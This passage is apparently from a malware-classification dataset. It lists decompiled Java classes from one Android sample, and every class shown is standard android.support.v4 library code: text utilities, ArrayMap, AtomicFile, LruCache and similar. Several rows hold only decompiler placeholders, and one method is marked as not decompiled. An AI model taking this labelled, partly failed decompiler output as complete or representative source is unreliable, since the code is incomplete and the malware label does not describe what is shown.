"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\AnyStrong.code","private static class AnyStrong implements TextDirectionAlgorithm {   private final boolean mLookForRtl;   public static final AnyStrong INSTANCE_RTL=new AnyStrong(true);   public static final AnyStrong INSTANCE_LTR=new AnyStrong(false);   @Override public int checkRtl(  CharSequence cs,  int start,  int count){     boolean haveUnlookedFor=false;     int e=start + count;     for (int i=start; i < e; i++) { switch (TextDirectionHeuristicsCompat.isRtlText(Character.getDirectionality(cs.charAt(i)))) { case 0:         if (this.mLookForRtl) {           return 0;         }       haveUnlookedFor=true;     break; case 1:   if (!this.mLookForRtl) {     return 1;   } haveUnlookedFor=true; break; } } if (haveUnlookedFor) { return !this.mLookForRtl ? 0 : 1; } return 2; } private AnyStrong(boolean lookForRtl){ this.mLookForRtl=lookForRtl; } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\BidiFormatter.code","!org.eclipse.jdt.core.dom.TypeDeclaration@1c4b12b7"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\Builder.code","public static final class Builder {   private int mFlags;   private boolean mIsRtlContext;   private TextDirectionHeuristicCompat mTextDirectionHeuristicCompat;   public Builder(){     initialize(BidiFormatter.isRtlLocale(Locale.getDefault()));   }   public Builder(  boolean rtlContext){     initialize(rtlContext);   }   public Builder(  Locale locale){     initialize(BidiFormatter.isRtlLocale(locale));   }   private void initialize(  boolean isRtlContext){     this.mIsRtlContext=isRtlContext;     this.mTextDirectionHeuristicCompat=BidiFormatter.DEFAULT_TEXT_DIRECTION_HEURISTIC;     this.mFlags=2;   }   public Builder stereoReset(  boolean stereoReset){     if (stereoReset) {       this.mFlags|=2;     }  else {       this.mFlags&=-3;     }     return this;   }   public Builder setTextDirectionHeuristic(  TextDirectionHeuristicCompat heuristic){     this.mTextDirectionHeuristicCompat=heuristic;     return this;   }   private static BidiFormatter getDefaultInstanceFromContext(  boolean isRtlContext){     return isRtlContext ? BidiFormatter.DEFAULT_RTL_INSTANCE : BidiFormatter.DEFAULT_LTR_INSTANCE;   }   public BidiFormatter build(){     return (this.mFlags == 2 && this.mTextDirectionHeuristicCompat == BidiFormatter.DEFAULT_TEXT_DIRECTION_HEURISTIC) ? getDefaultInstanceFromContext(this.mIsRtlContext) : new BidiFormatter(this.mIsRtlContext,this.mFlags,this.mTextDirectionHeuristicCompat);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\DirectionalityEstimator.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3a557a90"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\FirstStrong.code","private static class FirstStrong implements TextDirectionAlgorithm {   public static final FirstStrong INSTANCE=new FirstStrong();   @Override public int checkRtl(  CharSequence cs,  int start,  int count){     int result=2;     int e=start + count;     for (int i=start; i < e && result == 2; i++) {       result=TextDirectionHeuristicsCompat.isRtlTextOrFormat(Character.getDirectionality(cs.charAt(i)));     }     return result;   }   private FirstStrong(){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\ICUCompat.code","public class ICUCompat {   private static final ICUCompatImpl IMPL; interface ICUCompatImpl {     String addLikelySubtags(    String str);     String getScript(    String str);   } static class ICUCompatImplBase implements ICUCompatImpl {     ICUCompatImplBase(){     }     @Override public String getScript(    String locale){       return null;     }     @Override public String addLikelySubtags(    String locale){       return locale;     }   } static class ICUCompatImplIcs implements ICUCompatImpl {     ICUCompatImplIcs(){     }     @Override public String getScript(    String locale){       return ICUCompatIcs.getScript(locale);     }     @Override public String addLikelySubtags(    String locale){       return ICUCompatIcs.addLikelySubtags(locale);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 14) {       IMPL=new ICUCompatImplIcs();     }  else {       IMPL=new ICUCompatImplBase();     }   }   public static String getScript(  String locale){     return IMPL.getScript(locale);   }   public static String addLikelySubtags(  String locale){     return IMPL.addLikelySubtags(locale);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\ICUCompatIcs.code","class ICUCompatIcs {   private static final String TAG=""ICUCompatIcs"";   private static Method sAddLikelySubtagsMethod;   private static Method sGetScriptMethod;   ICUCompatIcs(){   } static {     try {       Class<?> clazz=Class.forName(""libcore.icu.ICU"");       if (clazz != null) {         sGetScriptMethod=clazz.getMethod(""getScript"",String.class);         sAddLikelySubtagsMethod=clazz.getMethod(""addLikelySubtags"",String.class);       }     }  catch (    Exception e) {       Log.w(TAG,e);     }   }   public static String getScript(  String locale){     try {       if (sGetScriptMethod != null) {         Object[] args={locale};         return (String)sGetScriptMethod.invoke(null,args);       }     }  catch (    IllegalAccessException e) {       Log.w(TAG,e);     } catch (    InvocationTargetException e2) {       Log.w(TAG,e2);     }     return null;   }   public static String addLikelySubtags(  String locale){     try {       if (sAddLikelySubtagsMethod != null) {         Object[] args={locale};         return (String)sAddLikelySubtagsMethod.invoke(null,args);       }     }  catch (    IllegalAccessException e) {       Log.w(TAG,e);     } catch (    InvocationTargetException e2) {       Log.w(TAG,e2);     }     return locale;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\ICUCompatImpl.code","interface ICUCompatImpl {   String addLikelySubtags(  String str);   String getScript(  String str); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\ICUCompatImplBase.code","static class ICUCompatImplBase implements ICUCompatImpl {   ICUCompatImplBase(){   }   @Override public String getScript(  String locale){     return null;   }   @Override public String addLikelySubtags(  String locale){     return locale;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\ICUCompatImplIcs.code","static class ICUCompatImplIcs implements ICUCompatImpl {   ICUCompatImplIcs(){   }   @Override public String getScript(  String locale){     return ICUCompatIcs.getScript(locale);   }   @Override public String addLikelySubtags(  String locale){     return ICUCompatIcs.addLikelySubtags(locale);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\TextDirectionAlgorithm.code","public interface TextDirectionAlgorithm {   int checkRtl(  CharSequence charSequence,  int i,  int i2); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\TextDirectionHeuristicCompat.code","public interface TextDirectionHeuristicCompat {   boolean isRtl(  CharSequence charSequence,  int i,  int i2);   boolean isRtl(  char[] cArr,  int i,  int i2); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\TextDirectionHeuristicImpl.code","!org.eclipse.jdt.core.dom.TypeDeclaration@c3d1999"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\TextDirectionHeuristicInternal.code","private static class TextDirectionHeuristicInternal extends TextDirectionHeuristicImpl {   private final boolean mDefaultIsRtl;   private TextDirectionHeuristicInternal(  TextDirectionAlgorithm algorithm,  boolean defaultIsRtl){     super(algorithm);     this.mDefaultIsRtl=defaultIsRtl;   }   @Override protected boolean defaultIsRtl(){     return this.mDefaultIsRtl;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\TextDirectionHeuristicLocale.code","private static class TextDirectionHeuristicLocale extends TextDirectionHeuristicImpl {   public static final TextDirectionHeuristicLocale INSTANCE=new TextDirectionHeuristicLocale();   public TextDirectionHeuristicLocale(){     super(null);   }   @Override protected boolean defaultIsRtl(){     int dir=TextUtilsCompat.getLayoutDirectionFromLocale(Locale.getDefault());     return dir == 1;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\TextDirectionHeuristicsCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@74c18e62"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.text\TextUtilsCompat.code","!org.eclipse.jdt.core.dom.TypeDeclaration@56bc5774"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\ArrayIterator.code","final class ArrayIterator<T> implements Iterator<T> {   boolean mCanRemove=false;   int mIndex;   final int mOffset;   int mSize;   ArrayIterator(  int offset){     this.mOffset=offset;     this.mSize=MapCollections.this.colGetSize();   }   @Override public boolean hasNext(){     return this.mIndex < this.mSize;   }   @Override public T next(){     T t=(T)MapCollections.this.colGetEntry(this.mIndex,this.mOffset);     this.mIndex++;     this.mCanRemove=true;     return t;   }   @Override public void remove(){     if (!this.mCanRemove) {       throw new IllegalStateException();     }     this.mIndex--;     this.mSize--;     this.mCanRemove=false;     MapCollections.this.colRemoveAt(this.mIndex);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\ArrayMap.code","public class ArrayMap<K,V> extends SimpleArrayMap<K,V> implements Map<K,V> {   MapCollections<K,V> mCollections;   public ArrayMap(){   }   public ArrayMap(  int capacity){     super(capacity);   }   public ArrayMap(  SimpleArrayMap map){     super(map);   }   private MapCollections<K,V> getCollection(){     if (this.mCollections == null) {       this.mCollections=new MapCollections<K,V>(){         @Override protected int colGetSize(){           return ArrayMap.this.mSize;         }         @Override protected Object colGetEntry(        int index,        int offset){           return ArrayMap.this.mArray[(index << 1) + offset];         }         @Override protected int colIndexOfKey(        Object key){           return key == null ? ArrayMap.this.indexOfNull() : ArrayMap.this.indexOf(key,key.hashCode());         }         @Override protected int colIndexOfValue(        Object value){           return ArrayMap.this.indexOfValue(value);         }         @Override protected Map<K,V> colGetMap(){           return ArrayMap.this;         }         @Override protected void colPut(        K key,        V value){           ArrayMap.this.put(key,value);         }         @Override protected V colSetValue(        int index,        V value){           return ArrayMap.this.setValueAt(index,value);         }         @Override protected void colRemoveAt(        int index){           ArrayMap.this.removeAt(index);         }         @Override protected void colClear(){           ArrayMap.this.clear();         }       } ;     }     return this.mCollections;   }   public boolean containsAll(  Collection<?> collection){     return MapCollections.containsAllHelper(this,collection);   }   @Override public void putAll(  Map<? extends K,? extends V> map){     ensureCapacity(this.mSize + map.size());     for (    Map.Entry<? extends K,? extends V> entry : map.entrySet()) {       put(entry.getKey(),entry.getValue());     }   }   public boolean removeAll(  Collection<?> collection){     return MapCollections.removeAllHelper(this,collection);   }   public boolean retainAll(  Collection<?> collection){     return MapCollections.retainAllHelper(this,collection);   }   @Override public Set<Map.Entry<K,V>> entrySet(){     return getCollection().getEntrySet();   }   @Override public Set<K> keySet(){     return getCollection().getKeySet();   }   @Override public Collection<V> values(){     return getCollection().getValues();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\AtomicFile.code","public class AtomicFile {   private final File mBackupName;   private final File mBaseName;   public AtomicFile(  File baseName){     this.mBaseName=baseName;     this.mBackupName=new File(baseName.getPath() + "".bak"");   }   public File getBaseFile(){     return this.mBaseName;   }   public void delete(){     this.mBaseName.delete();     this.mBackupName.delete();   }   public FileOutputStream startWrite() throws IOException {     if (this.mBaseName.exists()) {       if (!this.mBackupName.exists()) {         if (!this.mBaseName.renameTo(this.mBackupName)) {           Log.w(""AtomicFile"",""Couldn't rename file "" + this.mBaseName + "" to backup file ""+ this.mBackupName);         }       }  else {         this.mBaseName.delete();       }     }     try {       FileOutputStream str=new FileOutputStream(this.mBaseName);       return str;     }  catch (    FileNotFoundException e) {       File parent=this.mBaseName.getParentFile();       if (!parent.mkdir()) {         throw new IOException(""Couldn't create directory "" + this.mBaseName);       }       try {         FileOutputStream str2=new FileOutputStream(this.mBaseName);         return str2;       }  catch (      FileNotFoundException e2) {         throw new IOException(""Couldn't create "" + this.mBaseName);       }     }   }   public void finishWrite(  FileOutputStream str){     if (str != null) {       sync(str);       try {         str.close();         this.mBackupName.delete();       }  catch (      IOException e) {         Log.w(""AtomicFile"",""finishWrite: Got exception:"",e);       }     }   }   public void failWrite(  FileOutputStream str){     if (str != null) {       sync(str);       try {         str.close();         this.mBaseName.delete();         this.mBackupName.renameTo(this.mBaseName);       }  catch (      IOException e) {         Log.w(""AtomicFile"",""failWrite: Got exception:"",e);       }     }   }   public FileInputStream openRead() throws FileNotFoundException {     if (this.mBackupName.exists()) {       this.mBaseName.delete();       this.mBackupName.renameTo(this.mBaseName);     }     return new FileInputStream(this.mBaseName);   }   public byte[] readFully() throws IOException {     FileInputStream stream=openRead();     int pos=0;     try {       byte[] data=new byte[stream.available()];       while (true) {         int amt=stream.read(data,pos,data.length - pos);         if (amt <= 0) {           return data;         }         pos+=amt;         int avail=stream.available();         if (avail > data.length - pos) {           byte[] newData=new byte[pos + avail];           System.arraycopy(data,0,newData,0,pos);           data=newData;         }       }     }   finally {       stream.close();     }   }   static boolean sync(  FileOutputStream stream){     if (stream != null) {       try {         stream.getFD().sync();       }  catch (      IOException e) {         return false;       }     }     return true;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\ContainerHelpers.code","class ContainerHelpers {   static final int[] EMPTY_INTS=new int[0];   static final long[] EMPTY_LONGS=new long[0];   static final Object[] EMPTY_OBJECTS=new Object[0];   ContainerHelpers(){   }   public static int idealIntArraySize(  int need){     return idealByteArraySize(need * 4) / 4;   }   public static int idealLongArraySize(  int need){     return idealByteArraySize(need * 8) / 8;   }   public static int idealByteArraySize(  int need){     for (int i=4; i < 32; i++) {       if (need <= (1 << i) - 12) {         return (1 << i) - 12;       }     }     return need;   }   public static boolean equal(  Object a2,  Object b){     return a2 == b || (a2 != null && a2.equals(b));   }   public static int binarySearch(  int[] array,  int size,  int value){     int lo=0;     int hi=size - 1;     while (lo <= hi) {       int mid=(lo + hi) >>> 1;       int midVal=array[mid];       if (midVal < value) {         lo=mid + 1;       }  else {         if (midVal <= value) {           return mid;         }         hi=mid - 1;       }     }     return lo ^ (-1);   }   public static int binarySearch(  long[] array,  int size,  long value){     int lo=0;     int hi=size - 1;     while (lo <= hi) {       int mid=(lo + hi) >>> 1;       long midVal=array[mid];       if (midVal < value) {         lo=mid + 1;       }  else {         if (midVal <= value) {           return mid;         }         hi=mid - 1;       }     }     return lo ^ (-1);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\DebugUtils.code","public class DebugUtils {   public static void buildShortClassTag(  Object cls,  StringBuilder out){     int end;     if (cls == null) {       out.append(""null"");       return;     }     String simpleName=cls.getClass().getSimpleName();     if ((simpleName == null || simpleName.length() <= 0) && (end=(simpleName=cls.getClass().getName()).lastIndexOf(46)) > 0) {       simpleName=simpleName.substring(end + 1);     }     out.append(simpleName);     out.append('{');     out.append(Integer.toHexString(System.identityHashCode(cls)));   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\EntrySet.code","final class EntrySet implements Set<Map.Entry<K,V>> {   EntrySet(){   }   @Override public boolean add(  Map.Entry<K,V> object){     throw new UnsupportedOperationException();   }   @Override public boolean addAll(  Collection<? extends Map.Entry<K,V>> collection){     int oldSize=MapCollections.this.colGetSize();     for (    Map.Entry<K,V> entry : collection) {       MapCollections.this.colPut(entry.getKey(),entry.getValue());     }     return oldSize != MapCollections.this.colGetSize();   }   @Override public void clear(){     MapCollections.this.colClear();   }   @Override public boolean contains(  Object o){     if (!(o instanceof Map.Entry)) {       return false;     }     Map.Entry<?,?> e=(Map.Entry)o;     int index=MapCollections.this.colIndexOfKey(e.getKey());     if (index < 0) {       return false;     }     Object foundVal=MapCollections.this.colGetEntry(index,1);     return ContainerHelpers.equal(foundVal,e.getValue());   }   @Override public boolean containsAll(  Collection<?> collection){     Iterator<?> it=collection.iterator();     while (it.hasNext()) {       if (!contains(it.next())) {         return false;       }     }     return true;   }   @Override public boolean isEmpty(){     return MapCollections.this.colGetSize() == 0;   }   @Override public Iterator<Map.Entry<K,V>> iterator(){     return new MapIterator();   }   @Override public boolean remove(  Object object){     throw new UnsupportedOperationException();   }   @Override public boolean removeAll(  Collection<?> collection){     throw new UnsupportedOperationException();   }   @Override public boolean retainAll(  Collection<?> collection){     throw new UnsupportedOperationException();   }   @Override public int size(){     return MapCollections.this.colGetSize();   }   @Override public Object[] toArray(){     throw new UnsupportedOperationException();   }   @Override public <T>T[] toArray(  T[] array){     throw new UnsupportedOperationException();   }   @Override public boolean equals(  Object object){     return MapCollections.equalsSetHelper(this,object);   }   @Override public int hashCode(){     int result=0;     for (int i=MapCollections.this.colGetSize() - 1; i >= 0; i--) {       Object key=MapCollections.this.colGetEntry(i,0);       Object value=MapCollections.this.colGetEntry(i,1);       result+=(value == null ? 0 : value.hashCode()) ^ (key == null ? 0 : key.hashCode());     }     return result;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\KeySet.code","final class KeySet implements Set<K> {   KeySet(){   }   @Override public boolean add(  K object){     throw new UnsupportedOperationException();   }   @Override public boolean addAll(  Collection<? extends K> collection){     throw new UnsupportedOperationException();   }   @Override public void clear(){     MapCollections.this.colClear();   }   @Override public boolean contains(  Object object){     return MapCollections.this.colIndexOfKey(object) >= 0;   }   @Override public boolean containsAll(  Collection<?> collection){     return MapCollections.containsAllHelper(MapCollections.this.colGetMap(),collection);   }   @Override public boolean isEmpty(){     return MapCollections.this.colGetSize() == 0;   }   @Override public Iterator<K> iterator(){     return new ArrayIterator(0);   }   @Override public boolean remove(  Object object){     int index=MapCollections.this.colIndexOfKey(object);     if (index < 0) {       return false;     }     MapCollections.this.colRemoveAt(index);     return true;   }   @Override public boolean removeAll(  Collection<?> collection){     return MapCollections.removeAllHelper(MapCollections.this.colGetMap(),collection);   }   @Override public boolean retainAll(  Collection<?> collection){     return MapCollections.retainAllHelper(MapCollections.this.colGetMap(),collection);   }   @Override public int size(){     return MapCollections.this.colGetSize();   }   @Override public Object[] toArray(){     return MapCollections.this.toArrayHelper(0);   }   @Override public <T>T[] toArray(  T[] tArr){     return (T[])MapCollections.this.toArrayHelper(tArr,0);   }   @Override public boolean equals(  Object object){     return MapCollections.equalsSetHelper(this,object);   }   @Override public int hashCode(){     int result=0;     for (int i=MapCollections.this.colGetSize() - 1; i >= 0; i--) {       Object obj=MapCollections.this.colGetEntry(i,0);       result+=obj == null ? 0 : obj.hashCode();     }     return result;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\LogWriter.code","public class LogWriter extends Writer {   private StringBuilder mBuilder=new StringBuilder(128);   private final String mTag;   public LogWriter(  String tag){     this.mTag=tag;   }   @Override public void close(){     flushBuilder();   }   @Override public void flush(){     flushBuilder();   }   @Override public void write(  char[] buf,  int offset,  int count){     for (int i=0; i < count; i++) {       char c=buf[offset + i];       if (c == '\n') {         flushBuilder();       }  else {         this.mBuilder.append(c);       }     }   }   private void flushBuilder(){     if (this.mBuilder.length() > 0) {       Log.d(this.mTag,this.mBuilder.toString());       this.mBuilder.delete(0,this.mBuilder.length());     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\LongSparseArray.code","public class LongSparseArray<E> implements Cloneable {   private static final Object DELETED=new Object();   private boolean mGarbage;   private long[] mKeys;   private int mSize;   private Object[] mValues;   public LongSparseArray(){     this(10);   }   public LongSparseArray(  int initialCapacity){     this.mGarbage=false;     if (initialCapacity == 0) {       this.mKeys=ContainerHelpers.EMPTY_LONGS;       this.mValues=ContainerHelpers.EMPTY_OBJECTS;     }  else {       int initialCapacity2=ContainerHelpers.idealLongArraySize(initialCapacity);       this.mKeys=new long[initialCapacity2];       this.mValues=new Object[initialCapacity2];     }     this.mSize=0;   }   public LongSparseArray<E> m0clone(){     LongSparseArray<E> clone=null;     try {       clone=(LongSparseArray)super.clone();       clone.mKeys=(long[])this.mKeys.clone();       clone.mValues=(Object[])this.mValues.clone();       return clone;     }  catch (    CloneNotSupportedException e) {       return clone;     }   }   public E get(  long key){     return get(key,null);   }   public E get(  long j,  E e){     int binarySearch=ContainerHelpers.binarySearch(this.mKeys,this.mSize,j);     return (binarySearch < 0 || this.mValues[binarySearch] == DELETED) ? e : (E)this.mValues[binarySearch];   }   public void delete(  long key){     int i=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);     if (i >= 0 && this.mValues[i] != DELETED) {       this.mValues[i]=DELETED;       this.mGarbage=true;     }   }   public void remove(  long key){     delete(key);   }   public void removeAt(  int index){     if (this.mValues[index] != DELETED) {       this.mValues[index]=DELETED;       this.mGarbage=true;     }   }   private void gc(){     int n=this.mSize;     int o=0;     long[] keys=this.mKeys;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       Object val=values[i];       if (val != DELETED) {         if (i != o) {           keys[o]=keys[i];           values[o]=val;           values[i]=null;         }         o++;       }     }     this.mGarbage=false;     this.mSize=o;   }   public void put(  long key,  E value){     int i=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);     if (i >= 0) {       this.mValues[i]=value;       return;     }     int i2=i ^ (-1);     if (i2 < this.mSize && this.mValues[i2] == DELETED) {       this.mKeys[i2]=key;       this.mValues[i2]=value;       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();       i2=ContainerHelpers.binarySearch(this.mKeys,this.mSize,key) ^ (-1);     }     if (this.mSize >= this.mKeys.length) {       int n=ContainerHelpers.idealLongArraySize(this.mSize + 1);       long[] nkeys=new long[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     if (this.mSize - i2 != 0) {       System.arraycopy(this.mKeys,i2,this.mKeys,i2 + 1,this.mSize - i2);       System.arraycopy(this.mValues,i2,this.mValues,i2 + 1,this.mSize - i2);     }     this.mKeys[i2]=key;     this.mValues[i2]=value;     this.mSize++;   }   public int size(){     if (this.mGarbage) {       gc();     }     return this.mSize;   }   public long keyAt(  int index){     if (this.mGarbage) {       gc();     }     return this.mKeys[index];   }   public E valueAt(  int i){     if (this.mGarbage) {       gc();     }     return (E)this.mValues[i];   }   public void setValueAt(  int index,  E value){     if (this.mGarbage) {       gc();     }     this.mValues[index]=value;   }   public int indexOfKey(  long key){     if (this.mGarbage) {       gc();     }     return ContainerHelpers.binarySearch(this.mKeys,this.mSize,key);   }   public int indexOfValue(  E value){     if (this.mGarbage) {       gc();     }     for (int i=0; i < this.mSize; i++) {       if (this.mValues[i] == value) {         return i;       }     }     return -1;   }   public void clear(){     int n=this.mSize;     Object[] values=this.mValues;     for (int i=0; i < n; i++) {       values[i]=null;     }     this.mSize=0;     this.mGarbage=false;   }   public void append(  long key,  E value){     if (this.mSize != 0 && key <= this.mKeys[this.mSize - 1]) {       put(key,value);       return;     }     if (this.mGarbage && this.mSize >= this.mKeys.length) {       gc();     }     int pos=this.mSize;     if (pos >= this.mKeys.length) {       int n=ContainerHelpers.idealLongArraySize(pos + 1);       long[] nkeys=new long[n];       Object[] nvalues=new Object[n];       System.arraycopy(this.mKeys,0,nkeys,0,this.mKeys.length);       System.arraycopy(this.mValues,0,nvalues,0,this.mValues.length);       this.mKeys=nkeys;       this.mValues=nvalues;     }     this.mKeys[pos]=key;     this.mValues[pos]=value;     this.mSize=pos + 1;   }   public String toString(){     if (size() <= 0) {       return ""{}"";     }     StringBuilder buffer=new StringBuilder(this.mSize * 28);     buffer.append('{');     for (int i=0; i < this.mSize; i++) {       if (i > 0) {         buffer.append("", "");       }       long key=keyAt(i);       buffer.append(key);       buffer.append('=');       Object value=valueAt(i);       if (value != this) {         buffer.append(value);       }  else {         buffer.append(""(this Map)"");       }     }     buffer.append('}');     return buffer.toString();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\LruCache.code","public class LruCache<K,V> {   private int createCount;   private int evictionCount;   private int hitCount;   private final LinkedHashMap<K,V> map;   private int maxSize;   private int missCount;   private int putCount;   private int size;   public LruCache(  int maxSize){     if (maxSize <= 0) {       throw new IllegalArgumentException(""maxSize <= 0"");     }     this.maxSize=maxSize;     this.map=new LinkedHashMap<>(0,0.75f,true);   }   public final V get(  K k){     V v;     if (k == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       V v2=this.map.get(k);       if (v2 != null) {         this.hitCount++;         return v2;       }       this.missCount++;       V create=create(k);       if (create == null) {         return null;       } synchronized (this) {         this.createCount++;         v=(V)this.map.put(k,create);         if (v != null) {           this.map.put(k,v);         }  else {           this.size+=safeSizeOf(k,create);         }       }       if (v != null) {         entryRemoved(false,k,create,v);         return v;       }       trimToSize(this.maxSize);       return create;     }   }   public final V put(  K key,  V value){     V previous;     if (key == null || value == null) {       throw new NullPointerException(""key == null || value == null"");     } synchronized (this) {       this.putCount++;       this.size+=safeSizeOf(key,value);       previous=this.map.put(key,value);       if (previous != null) {         this.size-=safeSizeOf(key,previous);       }     }     if (previous != null) {       entryRemoved(false,key,previous,value);     }     trimToSize(this.maxSize);     return previous;   }   public void trimToSize(  int r7){     throw new UnsupportedOperationException(""Method not decompiled: android.support.v4.util.LruCache.trimToSize(int):void"");   }   public final V remove(  K key){     V previous;     if (key == null) {       throw new NullPointerException(""key == null"");     } synchronized (this) {       previous=this.map.remove(key);       if (previous != null) {         this.size-=safeSizeOf(key,previous);       }     }     if (previous != null) {       entryRemoved(false,key,previous,null);     }     return previous;   }   protected void entryRemoved(  boolean evicted,  K key,  V oldValue,  V newValue){   }   protected V create(  K key){     return null;   }   private int safeSizeOf(  K key,  V value){     int result=sizeOf(key,value);     if (result < 0) {       throw new IllegalStateException(""Negative size: "" + key + ""=""+ value);     }     return result;   }   protected int sizeOf(  K key,  V value){     return 1;   }   public final void evictAll(){     trimToSize(-1);   }   public final synchronized int size(){     return this.size;   }   public final synchronized int maxSize(){     return this.maxSize;   }   public final synchronized int hitCount(){     return this.hitCount;   }   public final synchronized int missCount(){     return this.missCount;   }   public final synchronized int createCount(){     return this.createCount;   }   public final synchronized int putCount(){     return this.putCount;   }   public final synchronized int evictionCount(){     return this.evictionCount;   }   public final synchronized Map<K,V> snapshot(){     return new LinkedHashMap(this.map);   }   public final synchronized String toString(){     String format; synchronized (this) {       int accesses=this.hitCount + this.missCount;       int hitPercent=accesses != 0 ? (this.hitCount * 100) / accesses : 0;       format=String.format(""LruCache[maxSize=%d,hits=%d,misses=%d,hitRate=%d%%]"",Integer.valueOf(this.maxSize),Integer.valueOf(this.hitCount),Integer.valueOf(this.missCount),Integer.valueOf(hitPercent));     }     return format;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.util\MapCollections.code","public abstract class MapCollections<K,V> {   MapCollections<K,V>.EntrySet mEntrySet;   MapCollections<K,V>.KeySet mKeySet;   MapCollections<K,V>.ValuesCollection mValues;   protected abstract void colClear();   protected abstract Object colGetEntry(  int i,  int i2);   protected abstract Map<K,V> colGetMap();   protected abstract int colGetSize();   protected abstract int colIndexOfKey(  Object obj);   protected abstract int colIndexOfValue(  Object obj);   protected abstract void colPut(  K k,  V v);   protected abstract void colRemoveAt(  int i);   protected abstract V colSetValue(  int i,  V v); final class ArrayIterator<T> implements Iterator<T> {     boolean mCanRemove=false;     int mIndex;     final int mOffset;     int mSize;     ArrayIterator(    int offset){       this.mOffset=offset;       this.mSize=MapCollections.this.colGetSize();     }     @Override public boolean hasNext(){       return this.mIndex < this.mSize;     }     @Override public T next(){       T t=(T)MapCollections.this.colGetEntry(this.mIndex,this.mOffset);       this.mIndex++;       this.mCanRemove=true;       return t;     }     @Override public void remove(){       if (!this.mCanRemove) {         throw new IllegalStateException();       }       this.mIndex--;       this.mSize--;       this.mCanRemove=false;       MapCollections.this.colRemoveAt(this.mIndex);     }   } final class MapIterator implements Iterator<Map.Entry<K,V>>, Map.Entry<K,V> {     int mEnd;     boolean mEntryValid=false;     int mIndex=-1;     MapIterator(){       this.mEnd=MapCollections.this.colGetSize() - 1;     }     @Override public boolean hasNext(){       return this.mIndex < this.mEnd;     }     @Override public Map.Entry<K,V> next(){       this.mIndex++;       